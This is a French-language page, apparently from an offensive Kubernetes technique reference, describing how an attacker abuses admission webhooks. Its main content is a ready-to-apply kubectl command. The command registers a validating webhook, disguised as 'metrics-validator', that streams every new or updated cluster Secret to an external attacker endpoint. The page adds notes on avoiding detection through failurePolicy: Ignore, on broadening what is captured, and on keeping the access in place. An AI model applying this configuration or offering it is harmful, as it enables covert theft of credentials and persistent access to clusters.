---
title: "Webhooks d'admission : intercepter le chemin des requêtes à l'API"
order: 2
description: "Les webhooks d'admission de validation et de mutation sont appelés par l'API server pour les opérations sur les objets correspondants. Un attaquant capable de créer une configuration de webhook s'insère dans le chemin des requêtes : un webhook de validation peut exfiltrer chaque objet soumis, y compris les secrets, vers un endpoint externe, et un webhook de mutation peut altérer les objets au moment de leur création, offrant à la fois persistance et visibilité à l'échelle du cluster."
keywords:
  - admission webhook
  - validatingwebhookconfiguration
  - mutatingwebhookconfiguration
  - api interception
  - persistence
---

# Webhooks d'admission

Les webhooks d'admission étendent l'API server : pour les types d'objets et les verbes configurés, l'API server appelle un endpoint de webhook avant de persister l'objet. Les webhooks de validation peuvent accepter ou rejeter ; les webhooks de mutation peuvent modifier. Un attaquant capable de créer une `ValidatingWebhookConfiguration` ou une `MutatingWebhookConfiguration` s'insère dans le chemin des requêtes à l'API pour les ressources et opérations qu'il cible. Un webhook de validation reçoit chaque objet correspondant, de sorte qu'en en pointant un vers `secrets` sur create et update, on exfiltre tous les nouveaux secrets vers un endpoint externe ; un webhook de mutation réécrit en outre les objets, ce qui est traité sur sa propre page.

Nécessite des droits de création sur les configurations de webhook :

```bash
kubectl auth can-i create validatingwebhookconfigurations
kubectl auth can-i create mutatingwebhookconfigurations
```

## Exfiltrer les objets soumis

```bash
cat <<YAML | kubectl apply -f -
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingWebhookConfiguration
metadata: { name: metrics-validator }
webhooks:
- name: v.attacker.example
  admissionReviewVersions: ["v1"]
  sideEffects: None
  failurePolicy: Ignore                 # do not break the cluster if the endpoint is down
  clientConfig: { url: "https://attacker.example/collect" }
  rules:
  - apiGroups: [""]
    apiVersions: ["v1"]
    operations: ["CREATE","UPDATE"]
    resources: ["secrets"]              # every new/updated secret is sent to the webhook
YAML
# the external endpoint receives an AdmissionReview JSON containing the full object
```

Chaque opération correspondante envoie une `AdmissionReview` vers l'URL de l'attaquant contenant l'objet complet, de sorte que chaque secret créé ou mis à jour à l'échelle du cluster est exfiltré au fur et à mesure.

## Notes d'exploitation

- `failurePolicy: Ignore` et `sideEffects: None` empêchent le webhook de casser les opérations du cluster si l'endpoint est indisponible, ce qui à la fois évite une détection par panne et maintient le cluster suffisamment sain pour continuer à fournir des objets.
- Cibler `secrets` sur CREATE/UPDATE transforme le webhook en un flux de secrets en direct ; élargir `resources` capture davantage de types d'objets et donc davantage d'identifiants et de configuration.
- Il s'agit de persistance plus collecte continue : cela continue de livrer tant que la configuration existe, indépendamment de tout token.
- Pour une injection active plutôt qu'une capture passive, utilisez une [porte dérobée par webhook de mutation](mutating-webhook-backdoor.md).

## Références

- [Kubernetes: dynamic admission control](https://kubernetes.io/docs/reference/access-authn-authz/extensible-admission-controllers/)
- [Microsoft: Kubernetes threat matrix](https://www.microsoft.com/en-us/security/blog/2021/03/23/secure-containerized-environments-with-updated-threat-matrix-for-kubernetes/)
